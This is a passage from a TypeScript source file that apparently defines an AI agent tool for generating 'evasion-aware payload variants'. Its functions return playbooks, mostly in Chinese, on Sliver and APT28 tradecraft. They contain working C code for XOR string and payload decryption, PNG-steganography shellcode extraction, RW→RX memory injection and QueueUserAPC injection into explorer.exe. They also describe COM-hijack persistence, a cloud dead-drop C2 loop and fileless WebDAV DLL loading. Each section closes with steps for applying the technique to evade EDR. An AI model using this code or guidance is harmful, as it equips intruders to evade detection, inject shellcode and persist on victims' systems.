  return `## Sliver Operational Patterns (from runner/runner.go + taskrunner/ analysis)

Sliver follows a specific operational sequence that differs from Havoc.

### Sliver's Execution Order:
1. **Check Execution Limits** → ExecLimits() at startup
   - Hostname, username, domain-joined, datetime, file-existence, locale
   - If any limit fails → os.Exit(1) immediately
   - This is the FIRST thing the implant does

2. **Connect to C2** → StartConnectionLoop() or StartBeaconLoop()
   - C2Generator selects next URL based on strategy (random/sequential)
   - For HTTP: Age key exchange → ChaCha20-Poly1305 session
   - For mTLS: Certificate auth → yamux multiplexing
   - For DNS: Base32 encoding, INIT with Age key exchange

3. **Register with Server** → registerSliver()
   - Sends hostname, username, OS, arch, PID, UUID
   - Server creates session/beacon record

4. **Receive Tasks** → sessionMainLoop() or beaconMainLoop()
   - Tasks dispatched to handlers via envelope system
   - Windows tasks wrapped in WrapperHandler (token impersonation)

5. **Execute Task** → Handler-specific logic
   - AMSI/ETW bypass: patchAmsi() / patchEtw() (0xC3 RET patch)
   - Process injection: refresh() → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
   - Assembly execution: InProc (CLR hosting) or Fork-and-Run (Donut + inject)

6. **Return Results** → connection.Send or pendingResults channel

### Key Differences from Havoc:
| Havoc | Sliver |
|-------|--------|
| Indirect syscalls | RefreshPE (disk-based unhook) |
| Hardware breakpoint AMSI bypass | 0xC3 memory patch AMSI bypass |
| Single execution mode | Dual mode (in-process + fork-and-run) |
| C2 handled by framework | Multi-transport abstraction (HTTP/DNS/WG/mTLS) |
| N/A | Traffic encoder polymorphism |
| N/A | Extension system (memmod + WASM + BOF) |

### How to apply:
- For Windows EDR: RefreshPE → AMSI patch → ETW patch → payload
- For network stealth: use polymorphic HTTP encoding
- For .NET tasks: choose in-process (stealth) vs fork-and-run (safety)
- For modular operations: load extensions on-demand (don't compile everything)
- For targeting: use execution limits to scope implant to specific hosts/users`
}

// ── APT28 (Operation Neusploit) — Alternating Byte XOR + Null Padding ──────

function apt28StringObfuscation(): string {
  return `## APT28 交替字节XOR + Null填充 字符串混淆（SimpleLoader.dll 逆向分析）

### 问题:
静态分析工具（strings、YARA规则）通过匹配连续可读字符串来识别恶意软件。
如果DLL中包含 "C:\\\\Windows\\\\System32\\\\cmd.exe" 这样的连续字符串，
YARA规则可以立即匹配到。

### APT28的解决方案: 交替真实字符 + Null填充 + XOR解密

**编码格式**: 真实字符和垃圾字节交替排列:
\`\`\`
原始字符串: "cmd.exe"
编码后（内存中）: [c][0x00][m][0x00][d][0x00][.][0x00][e][0x00][x][0x00][e][0x00][0x00][0x00]
               真实字节  垃圾    真实字节  垃圾    ...
\`\`\`

**运行时解密算法**:
\`\`\`c
wchar_t* DecryptString(const uint8_t* encrypted, size_t length, uint8_t xorKey) {
    wchar_t* result = (wchar_t*)malloc(length / 2 * sizeof(wchar_t));
    size_t outIdx = 0;

    for (size_t i = 0; i < length; i += 2) {
        // 只处理真实字符位置（偶数索引），跳过垃圾字节（奇数索引）
        uint8_t realByte = encrypted[i];     // 真实字符
        // encrypted[i+1] 是null/垃圾字节，直接跳过

        result[outIdx++] = (wchar_t)(realByte ^ xorKey);  // XOR解密
    }
    result[outIdx] = L'\\0';
    return result;
}
\`\`\`

**APT28使用的XOR密钥**:
- **0x43**: 单字节XOR，用于互斥量名称混淆
- **多字节密钥**: 用于API名称和路径字符串

**为什么有效**:
1. **打破连续字符串**: 真实字符被垃圾字节分隔，strings命令看到的是乱码
2. **YARA规则失效**: 无法匹配连续字符串模式
3. **内存中才解密**: 只有运行时动态分配的内存中才出现明文
4. **XOR密钥可更换**: 不同样本使用不同密钥，避免签名匹配

**如何应用到评估**:
- 对C payload中的敏感字符串（API名、路径、URL）使用交替字节编码
- 运行时用一个简单的循环解密，避免明文出现在二进制中
- 这比简单Base64更有效 — Base64编码的字符串本身是可识别的模式`
}

// ── APT28 — 76字节轮转XOR密钥载荷解密 ─────────────────────────────────────

function apt28RotatingXOR(): string {
  return `## APT28 76字节轮转XOR密钥 — 核心载荷解密（SimpleLoader.dll 分析）

### 问题:
单字节XOR（如0x43）密钥空间只有256种可能，可以被暴力破解。
固定密钥XOR对已知明文攻击脆弱。

### APT28的解决方案: 76字节轮转XOR密钥

**核心载荷**（通常加密存放在DLL的 .rdata 段或自定义资源段）
使用一个 **76字节长的密钥** 进行轮转异或加密。

**解密算法**:
\`\`\`c
// 76字节轮转XOR解密 — APT28 SimpleLoader核心载荷解密
uint8_t* DecryptPayload(const uint8_t* encryptedData, size_t dataLen,
                        const uint8_t* key, size_t keyLen) {
    // keyLen = 76 (APT28使用固定76字节密钥)

    // 步骤1: 分配PAGE_READWRITE权限的内存
    void* decrypted = VirtualAlloc(NULL, dataLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!decrypted) return NULL;

    // 步骤2: 逐字节轮转XOR解密
    uint8_t* out = (uint8_t*)decrypted;
    for (size_t i = 0; i < dataLen; i++) {
        out[i] = encryptedData[i] ^ key[i % keyLen];  // 轮转索引: i % 76
    }

    // 步骤3: 解密后内容可能还不是直接可执行代码
    // APT28: 解密后得到的是PNG图片，需要进一步隐写提取

    return (uint8_t*)decrypted;
}
\`\`\`

**密钥管理**:
- 76字节密钥本身也被混淆存储（可能用单字节XOR 0x43加密）
- 密钥在DLL数据段中以非连续方式存储
- 不同样本使用不同密钥

**为什么是76字节**:
- 密钥长度足够大（76字节 = 608位），暴力破解不可行
- 但又不会太大导致解密性能开销
- 轮转XOR = 多表替代密码，比单字节XOR安全得多

**与单字节XOR对比**:
| 单字节XOR (0x43) | 76字节轮转XOR |
|-----------------|--------------|
| 密钥空间: 256 | 密钥空间: 2^(76*8) = 2^608 |
| 可被频率分析破解 | 多表替代，频率分析无效 |
| YARA可写简单规则 | 每个样本密钥不同 |
| 暴力破解瞬间完成 | 暴力破解不可能 |

**如何应用**:
- 对核心payload使用多字节轮转XOR加密
- 密钥存储在混淆后的数据段中
- 运行时动态解密到RW权限内存`
}

// ── APT28 — PNG隐写术提取Shellcode ───────────────────────────────────────

function apt28PNGSteganography(): string {
  return `## APT28 PNG隐写术 — 从图片像素提取Shellcode（SimpleLoader.dll 分析）

### 问题:
直接将shellcode存储在二进制文件中容易被静态分析识别。
EDR/AV可以扫描内存中的shellcode特征码。

### APT28的解决方案: 将shellcode藏在PNG图片的像素数据中

这是APT28 Operation Neusploit中最具技术含量的部分。
SimpleLoader内置了**完整的PNG解码器**（10个专用函数），不依赖外部库。

### PNG文件结构:
\`\`\`
PNG文件 = PNG Signature (8字节) + Chunks
  ├── IHDR Chunk: 图片头（宽、高、位深、颜色类型）
  ├── PLTE Chunk: 调色板（索引颜色模式）
  ├── IDAT Chunk: 图像数据（压缩的像素数据）— shellcode藏在这里
  └── IEND Chunk: 图片结束标记
\`\`\`

### APT28的PNG解码流程（10个专用函数）:
\`\`\`c
// 步骤1: 解析IHDR头
ParseIHDR(pngData, offset) → width, height, bitDepth, colorType

// 步骤2: 遍历所有Chunk
while (chunkType != "IEND") {
    chunkLength = ReadUint32(pngData, offset);
    chunkType = ReadString(pngData, offset + 4, 4);

    if (chunkType == "PLTE") {
        // 提取调色板
        ExtractPalette(pngData, offset + 8, chunkLength);
    }
    else if (chunkType == "IDAT") {
        // 核心数据块 — shellcode隐藏在IDAT中
        // IDAT包含zlib压缩的像素数据
        DecompressIDAT(pngData, offset + 8, chunkLength);
        pixelData = InflateZlib(compressedData);
    }

    offset += 12 + chunkLength;  // length(4) + type(4) + data + crc(4)
}
\`\`\`

### LSB提取算法（APT28的方法）:
\`\`\`c
// 步骤3: 从像素数据中提取隐藏数据（LSB - 最低有效位）
uint8_t* ExtractHiddenData(uint8_t* pixelData, size_t pixelLen, size_t hiddenLen) {
    uint8_t* hidden = malloc(hiddenLen);
    size_t bitIndex = 0;

    // APT28使用特定偏移量和掩码提取
    // 可能的方法: 只提取每个像素RGB通道的最低位
    for (size_t i = 0; i < hiddenLen * 8; i++) {
        // 从像素数据的最低位提取1bit
        uint8_t lsb = pixelData[APT28_OFFSETS[i] % pixelLen] & 0x01;
        hidden[i / 8] |= (lsb << (7 - (i % 8)));
    }

    return hidden;
}

// 或者按步长跳跃读取:
uint8_t* ExtractWithStride(uint8_t* pixelData, size_t stride, size_t mask) {
    // stride = 步长（每隔N个像素读取一次）
    // mask = 掩码（如0x01取LSB，0x03取最低2位）
    // APT28可能使用自定义stride和mask组合
}
\`\`\`

### 完整的APT28解密链:
\`\`\`
1. 从DLL资源段读取加密的PNG文件 (SplashScreen.png)
   ↓
2. 76字节轮转XOR解密PNG文件数据
   ↓
3. 解析PNG格式 → 10个专用函数处理IHDR/PLTE/IDAT/IEND
   ↓
4. 从IDAT chunk提取压缩像素数据 → zlib解压
   ↓
5. LSB提取: 从像素最低位还原隐藏的二进制流
   ↓
6. 最后一道解密 (XOR或RC4) → 得到真正的shellcode
   ↓
7. VirtualAlloc(RW) → 写入shellcode → VirtualProtect(RX) → 执行
\`\`\`

### 为什么PNG隐写有效:
1. **静态分析绕过**: PNG图片看起来是正常的图片文件
2. **YARA规则失效**: shellcode不连续存储在二进制中
3. **需要完整的PNG解析器**才能提取 — 增加了逆向分析难度
4. **多层加密**: XOR → PNG压缩 → LSB → 最终XOR/RC4
5. **网络流量中不易检测**: 传输图片文件是正常的网络行为

### 如何应用到评估:
- 将shellcode嵌入PNG图片的LSB位
- 加载器内置精简PNG解析逻辑
- 多层加密增加分析难度
- 图片文件在磁盘和网络中都不引起怀疑`
}

// ── APT28 — RW→RX页面转换（避免RWX检测） ──────────────────────────────────

function apt28MemoryPermissionTransition(): string {
  return `## APT28 内存权限转换 — RW→RX避免EDR检测

### 问题:
现代EDR对 PAGE_EXECUTE_READWRITE (RWX) 内存极其敏感。
直接分配RWX权限内存 → 写入shellcode → 执行，是最常见的恶意软件模式。
许多EDR规则直接告警: "进程分配了RWX内存"。

### APT28的解决方案: 两阶段内存权限管理

**APT28的做法（SimpleLoader + CovenantGrunt注入流程）**:
\`\`\`c
// 步骤1: 分配 PAGE_READWRITE (RW) 权限内存 — 不触发RWX告警
LPVOID shellcodeAddr = VirtualAllocEx(
    hProcess,                    // explorer.exe句柄
    NULL,                        // 让系统选择地址
    shellcodeSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE               // 注意: RW, NOT RWX!
);

// 步骤2: 写入shellcode（此时内存是RW，可以写入）
WriteProcessMemory(hProcess, shellcodeAddr, decryptedShellcode, shellcodeSize, NULL);

// 步骤3: 关键一步 — 修改权限为 PAGE_EXECUTE_READ (RX)
DWORD oldProtect;
VirtualProtectEx(
    hProcess,
    shellcodeAddr,
    shellcodeSize,
    PAGE_EXECUTE_READ,           // RX, 不是RWX!
    &oldProtect
);

// 步骤4: 执行shellcode（此时内存是RX，只能读和执行）
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
\`\`\`

### 为什么这比RWX更安全:
| 权限 | 写入 | 执行 | EDR告警 |
|------|------|------|---------|
| PAGE_EXECUTE_READWRITE (RWX) | 是 | 是 | **高** — 最常见恶意模式 |
| PAGE_READWRITE → PAGE_EXECUTE_READ (RW→RX) | 阶段1 | 阶段2 | **低** — 合法软件也这样做 |
| PAGE_READWRITE (RW) | 是 | 否 | 无 — 但无法执行 |
| PAGE_EXECUTE_READ (RX) | 否 | 是 | 低 — 但无法写入 |

### 合法软件也使用RW→RX:
- JIT编译器（V8 JavaScript引擎、.NET CLR）: 先写入编译代码(RW)，再设置为可执行(RX)
- 动态链接器: 先加载代码到内存(RW)，然后fixup重定位后设为RX
- 因此RW→RX在合法软件中很常见，EDR难以区分

### APT28的更精细做法:
\`\`\`c
// CovenantGrunt使用的内存权限转换:

// 1. 先分配RW内存
LPVOID mem = VirtualAllocEx(hProcess, 0, size, MEM_COMMIT, PAGE_READWRITE);

// 2. 写入加密的shellcode
WriteProcessMemory(hProcess, mem, encryptedShellcode, size, NULL);

// 3. 在目标进程中就地解密（仍为RW权限）
// 这样EDR即使扫描内存，看到的是解密过程中的混合数据

// 4. 解密完成后立即修改为RX
VirtualProtectEx(hProcess, mem, size, PAGE_EXECUTE_READ, &oldProtect);

// 5. 执行 — 此时内存只有RX权限，无法再修改
\`\`\`

### 如何应用到评估:
- 永远不要直接分配RWX内存
- 使用两阶段: RW写入 → RX执行
- 更隐蔽的做法: 在RW阶段就解密完成，然后立即转RX
- 这比简单的VirtualAlloc+RWX要安全得多`
}

// ── APT28 — APC注入（QueueUserAPC） ──────────────────────────────────────

function apt28APCInjection(): string {
  return `## APT28 APC注入 — QueueUserAPC比CreateRemoteThread更隐蔽

### 问题:
CreateRemoteThread是最常见的进程注入执行方式，
也是EDR重点监控的API调用。创建远程线程 = 高告警等级。

### APT28的解决方案: 异步过程调用（APC）注入

**APC注入流程**:
\`\`\`c
// 步骤1: 枚举进程，找到目标（如explorer.exe）
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
PROCESSENTRY32 pe32;
pe32.dwSize = sizeof(PROCESSENTRY32);
Process32First(hSnapshot, &pe32);

DWORD targetPid = 0;
do {
    if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {
        targetPid = pe32.th32ProcessID;
        break;
    }
} while (Process32Next(hSnapshot, &pe32));

// 步骤2: 打开目标进程
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);

// 步骤3: 在目标进程中分配内存 (RW权限)
LPVOID mem = VirtualAllocEx(hProcess, NULL, shellcodeSize,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// 步骤4: 写入shellcode
WriteProcessMemory(hProcess, mem, shellcode, shellcodeSize, NULL);

// 步骤5: 修改权限为RX
VirtualProtectEx(hProcess, mem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

// 步骤6: 【关键区别】使用QueueUserAPC而非CreateRemoteThread
// 枚举目标进程的所有线程
HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
THREADENTRY32 te32;
te32.dwSize = sizeof(THREADENTRY32);
Thread32First(hThreadSnap, &te32);

do {
    if (te32.th32OwnerProcessID == targetPid) {
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
        if (hThread) {
            // 将shellcode地址加入APC队列
            // 当线程进入"可告警等待状态"时自动执行
            QueueUserAPC((PAPCFUNC)mem, hThread, 0);
            CloseHandle(hThread);
            break;
        }
    }
} while (Thread32Next(hThreadSnap, &te32));
\`\`\`

### APC注入为什么更隐蔽:
1. **不创建新线程**: QueueUserAPC不创建新线程，只是往现有线程的APC队列添加一个回调
2. **EDR监控较少**: CreateRemoteThread是EDR重点监控的API，QueueUserAPC监控较少
3. **执行时机隐蔽**: APC在目标线程进入"可告警等待状态"（SleepEx、WaitForSingleObjectEx等）时执行
4. **线程上下文**: shellcode在目标进程的正常线程中执行，不是新线程

### APC注入的局限:
- 需要目标线程进入可告警等待状态才会触发
- 如果目标线程很忙或不调用可告警等待函数，APC可能延迟执行
- 解决: explorer.exe经常进入等待状态（等待用户输入），所以是理想目标

### 对比:
| CreateRemoteThread | QueueUserAPC |
|-------------------|-------------|
| 创建新线程 | 复用现有线程 |
| EDR重点监控 | EDR监控较少 |
| 立即执行 | 等待可告警状态 |
| 容易被检测 | 更隐蔽 |

### 如何应用到评估:
- 进程注入时优先使用APC而非CreateRemoteThread
- 选择经常进入等待状态的进程（explorer.exe、svchost.exe）
- 结合RW→RX权限转换，进一步降低检测率`
}

// ── APT28 — COM劫持持久化 ────────────────────────────────────────────────

function apt28COMHijacking(): string {
  return `## APT28 COM劫持持久化 — InprocServer32注册表修改

### 问题:
传统的Run键注册表启动项（HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run）
容易被安全软件监控和检测到。

### APT28的解决方案: COM组件劫持

APT28修改注册表中的COM组件注册信息，将合法CLSID的InprocServer32指向自己的DLL。

### APT28使用的具体注册表路径:
\`\`\`
HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}\\\\InprocServer32
\`\`\`

**修改前**: (默认值) = C:\\\\Windows\\\\System32\\\\legit.dll （合法系统DLL）
**修改后**: (默认值) = C:\\\\Users\\\\Public\\\\伪装名.dll （APT28的后门DLL）

### COM劫持的工作原理:
\`\`\`
1. 系统或合法应用尝试创建COM对象 {D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}
   ↓
2. Windows COM运行时查询注册表: HKCU\\\\...\\\\CLSID\\\\{...}\\\\InprocServer32
   ↓
3. 读取 (默认值) 注册表项 → 获取DLL路径
   ↓
4. 调用 LoadLibrary(DLL路径) 加载DLL
   ↓
5. APT28的后门DLL被加载到合法进程的内存中
   ↓
6. DLL的DllMain执行 → 启动后门/C2通信
\`\`\`

### 为什么COM劫持有效:
1. **隐蔽**: 不修改Run键等常见自启动位置
2. **合法触发**: 系统操作正常触发COM组件加载，不是恶意进程启动
3. **权限要求低**: HKCU（当前用户）权限即可修改，不需要管理员
4. **加载到合法进程**: DLL被系统/合法应用加载，进程看起来正常
5. **持久化**: 每次系统尝试加载该COM组件时都会触发

### APT28的额外隐蔽措施:
\`\`\`
# 使用不常见但合法的CLSID:
{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}
  - 这是Windows系统中的一个COM组件
  - 不常用，被劫持后不容易被发现

# 伪装DLL文件名:
使用看起来合法的名字，如:
  - msedge_update.dll
  - onedrive_sync.dll
  - windows_helper.dll

# 线程延迟启动:
在DllMain中不直接执行后门代码，而是:
1. 创建新线程
2. 线程Sleep随机时间（避免启动时立即触发）
3. 然后执行C2连接
\`\`\`

### 其他可劫持的COM键值:
\`\`\`
HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{...}\\\\InprocServer32    # DLL加载
HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{...}\\\\LocalServer32    # EXE加载
HKCU\\\\Software\\\\Classes\\\\*\\\\shellex\\\\ContextMenuHandlers  # 右键菜单
HKCU\\\\Software\\\\Classes\\\\*\\\\shellex\\\\PropertySheetHandlers # 属性页
\`\`\`

### 如何应用到评估:
- 使用不常见的CLSID进行劫持
- DLL名称伪装成合法软件
- 在DllMain中使用延迟执行
- 劫持后DLL被合法进程加载，进程行为看起来正常`
}

// ── APT28 — Dead Drop Resolver（云API C2） ───────────────────────────────

function apt28DeadDropResolver(): string {
  return `## APT28 Dead Drop Resolver — 合法云API作为C2通信信道

### 问题:
直接连接攻击者的C2服务器容易被网络监控检测到。
固定的IP、域名、端口、协议都是网络签名的基础。

### APT28的解决方案: 使用合法云服务API作为Dead Drop

APT28的CovenantGrunt后门不直接连接攻击者IP，
而是使用 **filen.io**（合法云盘服务）的官方API进行交互。

### Dead Drop工作原理:
\`\`\`
1. CovenantGrunt定期（Beaconing）发起HTTPS请求到filen.io的API:
   → POST https://api.filen.io/v1/file/list
   → 看起来像正常的云盘同步操作

2. 攻击者在filen.io的特定共享目录中放置指令:
   → 指令隐藏在正常文件的特定字段中
   → 可能是加密的配置文件、文本文件、甚至图片元数据

3. 植入物下载并解析文件:
   → 提取隐藏的指令（如执行命令、下载新模块等）
   → 执行指令后将结果上传到另一个隐藏位置

4. 双向通信:
   → 植入物读取 → 获取攻击者指令
   → 植入物写入 → 上传执行结果
\`\`\`

### 为什么Dead Drop有效:
1. **合法域名**: filen.io是合法云服务，不会被防火墙/IDS封禁
2. **HTTPS加密**: 所有通信通过HTTPS，中间人无法看到内容
3. **流量正常**: 看起来像正常的云盘API调用
4. **无固定C2基础设施**: 不需要攻击者运营C2服务器
5. **异步通信**: 指令和结果通过第三方平台中转
6. **快速切换**: 可以换用其他云服务（Google Drive, Dropbox等）

### 类似技术:
- Dropbox作为Dead Drop
- GitHub/GitLab仓库存放指令
- Pastebin作为命令中转站
- Telegram Bot API作为C2信道
- Discord Webhook作为C2信道

### Dead Drop的通信流程:
\`\`\`c
// 伪代码 — APT28 CovenantGrunt的Dead Drop通信
void BeaconAndCheckCommands() {
    // 1. 生成看起来正常的API请求
    char* request = BuildFilenAPIRequest(
        "POST", "/v1/file/list",
        "Authorization: Bearer " + API_TOKEN,
        "{\\"folder_id\\": \\"TARGET_FOLDER\\"}"
    );

    // 2. 通过系统代理或直连发送HTTPS请求
    HTTPResponse* resp = SendHTTPSRequest(
        "api.filen.io", 443,
        request
    );

    // 3. 解析响应，提取隐藏指令
    Command* cmd = ExtractHiddenCommand(resp->body);

    if (cmd != NULL) {
        // 4. 执行指令
        Result* result = ExecuteCommand(cmd);

        // 5. 上传结果到隐藏位置
        UploadResult(result);
    }
}
\`\`\`

### 如何应用到评估:
- 使用合法云服务的API进行C2通信
- 指令隐藏在正常的API响应中
- 利用HTTPS加密隐藏通信内容
- 选择合适的云服务（API文档公开、流量正常、不被封锁）
- 这种方法在对抗网络层检测时极其有效`
}

// ── APT28 — WebDAV UNC路径无落地执行 ─────────────────────────────────────

function apt28WebDAVUNC(): string {
  return `## APT28 WebDAV UNC路径 — DLL无落地内存加载执行

### 问题:
将恶意DLL写到磁盘上容易被文件监控检测。
文件落地 → EDR扫描文件 → 检测到恶意特征。

### APT28的解决方案: UNC路径直接从WebDAV服务器加载DLL，不写磁盘

**APT28的LNK构造**:
\`\`\`
LNK文件的Target属性:
C:\\\\Windows\\\\System32\\\\rundll32.exe \\\\104.168.x.x\\\\webdav\\\\SimpleLoader.dll,EntryPoint

关键点:
1. 使用UNC路径 (\\\\server\\\\share\\\\file.dll)
2. 通过Windows WebClient服务访问远程WebDAV共享
3. DLL直接从网络加载到内存，不写到本地磁盘
4. rundll32.exe是系统合法程序（LOLBin）
\`\`\`

### WebDAV UNC加载流程:
\`\`\`
1. 用户打开RTF/DOC文档
   ↓
2. OLE对象触发 → COM对象 Shell.Explorer.1 被实例化
   ↓
3. Shell.Explorer.1的LocationURL = \\\\104.168.x.x\\\\webdav\\\\payload.lnk
   ↓
4. Windows WebClient服务发起出站WebDAV请求
   ↓
5. payload.lnk被执行 → rundll32.exe加载SimpleLoader.dll
   ↓
6. SimpleLoader.dll从UNC路径映射到内存（不落地）
   ↓
7. rundll32.exe调用SimpleLoader.dll的EntryPoint
\`\`\`

### 底层API行为:
\`\`\`c
// 当访问UNC路径时:
// 1. WebClient服务启动（如未运行则自动启动）
// 2. 发起HTTP/WebDAV请求到远程服务器
// 3. 将远程文件映射到本地网络驱动器
// 4. rundll32.exe通过内存映射读取DLL
// 5. LoadLibrary从网络路径加载DLL

// 关键: 文件数据直接从网络流读取到内存
// 不经过本地文件系统的Write操作
\`\`\`

### 为什么这有效:
1. **无文件落地**: DLL不写入本地磁盘 — 文件监控检测不到
2. **合法进程**: rundll32.exe是系统自带程序
3. **合法协议**: WebDAV是Windows内置协议
4. **LOLBin**: Living Off the Land Binary — 使用系统自带工具
5. **系统服务级别**: 通过WebClient服务发起请求，下沉到系统服务层
6. **绕过应用层监控**: 很多EDR只监控Office进程的HTTP请求，不监控系统服务

### 互斥量防多开:
\`\`\`c
// SimpleLoader.dll运行的第一件事:
// CreateMutexW — 确保只运行一次

// 互斥量名称混淆:
// 使用XOR 0x43解密互斥量名称
const uint8_t encodedMutex[] = {0x41, 0x22, 0x55, ...}; // XOR 0x43后得到真实名称
wchar_t* mutexName = DecryptString(encodedMutex, sizeof(encodedMutex), 0x43);

HANDLE hMutex = CreateMutexW(NULL, TRUE, mutexName);
if (GetLastError() == ERROR_ALREADY_EXISTS) {
    // 已经感染过，立即退出
    ExitProcess(0);
}
\`\`\`

### 如何应用到评估:
- 使用UNC路径从WebDAV加载DLL，避免文件落地
- 结合rundll32.exe等LOLBin执行
- 使用互斥量防止重复执行
- 互斥量名称用XOR混淆存储`
}

// ── APT28 综合操作模式 ───────────────────────────────────────────────────

function apt28OperationalPattern(): string {
  return `## APT28 操作模式 — Operation Neusploit 完整感染链分析

APT28在CVE-2026-21509利用中展现了多层递进的免杀对抗思路。

### 完整感染链:
\`\`\`
第一阶段: 文档触发
  RTF文件 → CVE-2026-21509 → COM对象 Shell.Explorer.1 → UNC路径访问

第二阶段: WebDAV拉取
  UNC \\\\attacker\\\\webdav\\\\ → payload.lnk + SimpleLoader.dll (无落地)

第三阶段: SimpleLoader执行
  CreateMutexW (防多开, XOR 0x43混淆)
  → 交替字节XOR解密字符串
  → VirtualAlloc(RW) 分配内存
  → 76字节轮转XOR解密核心载荷
  → PNG解码 (10个专用函数: IHDR/PLTE/IDAT/IEND)
  → LSB隐写提取shellcode
  → 最终XOR/RC4解密

第四阶段: 进程注入
  枚举explorer.exe进程
  → VirtualAllocEx(RW) 分配内存
  → WriteProcessMemory 写入shellcode
  → VirtualProtectEx 修改为RX (不是RWX!)
  → QueueUserAPC 注入 (不是CreateRemoteThread!)

第五阶段: C2通信
  CovenantGrunt .NET后门
  → HTTPS到filen.io官方API (Dead Drop Resolver)
  → 定期Beaconing检查指令
  → 指令隐藏在文件/配置中

第六阶段: 持久化
  COM劫持: HKCU\\\\...\\\\CLSID\\\\{...}\\\\InprocServer32
  → 将合法DLL路径替换为后门DLL
  → 系统正常操作触发加载
\`\`\`

### APT28免杀对抗核心思路:
1. **多层加密**: XOR(单字节) → XOR(轮转76字节) → PNG隐写 → 最终XOR/RC4
2. **无文件落地**: UNC路径直接内存加载
3. **合法工具**: rundll32.exe、WebClient服务、COM组件
4. **权限最小化**: RW→RX，避免RWX
5. **隐蔽执行**: APC注入 > CreateRemoteThread
6. **合法C2**: 云API替代直接C2服务器
7. **隐蔽持久化**: COM劫持替代Run键

### 与Havoc/Sliver的区别:
| APT28 | Havoc | Sliver |
|-------|-------|--------|
| PNG隐写载荷 | C源码编译 | Go编译 |
| 76字节轮转XOR | Hash API解析 | Garble混淆 |
| Dead Drop云API | 自建C2 | 多传输协议 |
| COM劫持持久化 | N/A | 服务安装 |
| UNC无落地 | N/A | N/A |
| APC注入 | 间接syscall | CreateRemoteThread |
| RW→RX转换 | N/A | RW→RX(有时) |

### 如何应用:
- 多层加密链: 至少2-3层加密叠加
- 文件不落地的UNC/WebDAV加载
- 使用LOLBin执行payload
- APC注入替代CreateRemoteThread
- 永远使用RW→RX而非RWX
- 考虑Dead Drop模式的C2通信
- COM劫持作为隐蔽持久化手段`
}

// ── Tool implementation ────────────────────────────────────────────────────

interface TechniqueGeneratorInput {
  technique: 'amsi_bypass' | 'etw_bypass' | 'shellcode_encode' | 'waf_evasion' | 'obfuscated_ps' | 'havoc_strategy' | 'sliver_strategy' | 'refresh_pe' | 'sgn_encoding' | 'traffic_encoder' | 'pe_donor' | 'dotnet_dual' | 'go_template' | 'apt28_strategy' | 'apt28_string_obf' | 'apt28_rotating_xor' | 'apt28_png_stego' | 'apt28_memory_transition' | 'apt28_apc_inject' | 'apt28_com_hijack' | 'apt28_dead_drop' | 'apt28_webdav_unc' | 'custom'
  payload: string
  platform?: 'windows' | 'linux'
  analysis_context?: { waf?: string; edr?: string; sandbox?: boolean }
  encoding?: 'base64' | 'hex' | 'xor'
}

export class TechniqueGeneratorTool implements Tool {
  name = 'TechniqueGenerator'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'TechniqueGenerator',
      description: `Generate evasion-aware payload variants for authorized security assessments.

## Techniques
- amsi_bypass: PowerShell AMSI bypass (reflection patch / string obfuscation / env vars)
- etw_bypass: ETW logging bypass (reflection patch / registry)
- shellcode_encode: Shellcode encoding (XOR/Base64/Hex + decoder stub)
- waf_evasion: WAF bypass (chunked encoding / parameter pollution / Unicode)
- obfuscated_ps: PowerShell obfuscation (base64/IEX/string splitting)
- havoc_strategy: Return Havoc-derived evasion strategy principles
- sliver_strategy: Return Sliver-derived evasion strategy principles (RefreshPE, SGN, traffic encoding, etc.)
- refresh_pe: DLL unhooking by reloading .text section from disk (Sliver approach)
- sgn_encoding: Shikata-Ga-Nai polymorphic shellcode encoding
- traffic_encoder: HTTP traffic encoder polymorphism
- pe_donor: PE metadata spoofing from legitimate binaries
- dotnet_dual: Dual-mode .NET execution guidance (in-process CLR vs fork-and-run)
- go_template: Go template conditional compilation principles
- apt28_strategy: Return APT28 (Operation Neusploit) derived evasion strategy principles
- apt28_string_obf: Alternating byte XOR + null padding string obfuscation (SimpleLoader)
- apt28_rotating_xor: 76-byte rotating XOR key payload decryption
- apt28_png_stego: PNG steganography shellcode extraction (IDAT LSB)
- apt28_memory_transition: RW→RX page transition avoiding RWX detection
- apt28_apc_inject: APC injection via QueueUserAPC (stealthier than CreateRemoteThread)
- apt28_com_hijack: COM hijacking persistence via InprocServer32
- apt28_dead_drop: Dead Drop Resolver — cloud API as C2 channel
- apt28_webdav_unc: WebDAV UNC path DLL loading without disk landing
- custom: Custom bypass technique`,
      parameters: {
        type: 'object',
        properties: {
          technique: {
            type: 'string',
            enum: ['amsi_bypass', 'etw_bypass', 'shellcode_encode', 'waf_evasion', 'obfuscated_ps', 'havoc_strategy', 'sliver_strategy', 'refresh_pe', 'sgn_encoding', 'traffic_encoder', 'pe_donor', 'dotnet_dual', 'go_template', 'apt28_strategy', 'apt28_string_obf', 'apt28_rotating_xor', 'apt28_png_stego', 'apt28_memory_transition', 'apt28_apc_inject', 'apt28_com_hijack', 'apt28_dead_drop', 'apt28_webdav_unc', 'custom'],
            description: 'Evasion technique type',
          },
          payload: { type: 'string', description: 'Original payload/command/shellcode' },
          platform: { type: 'string', enum: ['windows', 'linux'], description: 'Target platform' },
          analysis_context: {
            type: 'object',
            properties: {
              waf: { type: 'string', description: 'Detected WAF type' },
              edr: { type: 'string', description: 'Detected EDR type' },
              sandbox: { type: 'boolean', description: 'Whether in sandbox environment' },
            },
            description: 'EnvAnalyzer detection results',
          },
